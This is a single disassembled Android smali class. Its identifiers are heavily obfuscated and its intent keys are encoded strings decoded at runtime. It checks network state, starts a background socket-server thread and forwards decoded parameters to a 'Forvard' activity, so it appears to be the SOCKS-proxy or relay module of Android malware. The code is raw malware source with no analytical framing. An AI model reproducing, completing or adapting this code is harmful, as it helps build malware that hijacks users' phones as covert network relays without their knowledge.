.class public Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;
.super Landroid/app/Activity;


# static fields
.field public static fsafsdfsfsdfsfsdfsd:Landroid/net/ConnectivityManager;

.field public static sdfsdfsdfsdf:Landroid/net/NetworkInfo;


# instance fields
.field private zxcvxvsdvsvsvs:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, "SocketServer"

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;->zxcvxvsdvsvsvs:Ljava/lang/String;

    return-void
.end method

.method static synthetic fsafsdfsfsdfsfsdfsd(Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;->zxcvxvsdvsvsvs:Ljava/lang/String;

    return-object v0
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 6

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, "]K^Y"

    invoke-static {v1}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "_9]\""

    invoke-static {v2}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "_^X"

    invoke-static {v3}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "\\\"N$[\u0005@5D%"

    invoke-static {v4}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v0, "NECDHIYC[CYS"

    invoke-static {v0}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    sput-object v0, Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;->fsafsdfsfsdfsfsdfsd:Landroid/net/ConnectivityManager;

    sget-object v0, Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;->fsafsdfsfsdfsfsdfsd:Landroid/net/ConnectivityManager;

    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v0

    sput-object v0, Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;->sdfsdfsdfsdf:Landroid/net/NetworkInfo;

    new-instance v0, Ljava/lang/Thread;

    new-instance v5, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;

    invoke-direct {v5, p0}, Lcompse/refact/st/upsssss/Socks/sdfsdfsdfsdf;-><init>(Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;)V

    invoke-direct {v0, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    new-instance v0, Landroid/content/Intent;

    const-class v5, Lcompse/refact/st/upsssss/Socks/Forvard;

    invoke-direct {v0, p0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v5, "_7\\%"

    invoke-static {v5}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const-string v1, "]E_^"

    invoke-static {v1}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const-string v1, "#\\$"

    invoke-static {v1}, Lcompse/refact/st/upsssss/Socks/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const-string v1, "^^LXYyBIFY"

    invoke-static {v1}, Lcompse/refact/st/upsssss/zxcvxvsdvsvsvs;->zxcvxvsdvsvsvs(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Socks/Socksdsfsdfsd;->startActivity(Landroid/content/Intent;)V

    return-void
.end method
